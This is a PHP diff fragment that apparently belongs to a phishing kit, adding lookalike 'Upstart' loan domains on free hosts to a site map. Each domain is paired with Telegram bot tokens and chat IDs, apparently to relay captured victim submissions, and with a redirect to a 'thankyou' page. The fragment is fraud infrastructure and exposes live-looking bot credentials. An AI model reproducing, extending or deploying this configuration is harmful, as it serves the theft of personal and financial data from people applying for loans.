@@ -22,6 +22,35 @@ $site_map = [
         'redirect' => 'https://upstartloan.rf.gd/cache_site/thankyou.html'
     ],
 
+
+    'upstart-loans.42web.io' => [
+        'bots' => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '7611371083:AAE31mneMfDJYHNN_TidWJxfXV_2mV6kAVY', 'chat_id' => '7950407416']
+
+        ],
+        'redirect' => 'https://upstart-loans.42web.io/cache_site/thankyou.html'
+    ],
+    'upstart-loans.wuaze.com' => [
+        'bots' => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '7956417008:AAE_AajDMFr5uyaWrObRwXSRCsXXDeAlBuQ', 'chat_id' => '1566821522']
+
+        ],
+        'redirect' => 'https://upstart-loans.wuaze.com/cache_site/thankyou.html'
+    ],
+    'upstartloans.wuaze.com' => [
+        'bots' => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '7797738217:AAG_PAbslwMCUjOjknuXbuDKhve87D0E0yM', 'chat_id' => '7336413391']
+
+        ],
+        'redirect' => 'https://upstartloans.wuaze.com/cache_site/thankyou.html'
+    ],
+
+
+
+
     'site2.com' => [
         'bots' => [
             ['token' => '7570530329:AAGCyvAYZQd45RebzrTY1oHoDEOmxe1ackI', 'chat_id' => '6494353790'],
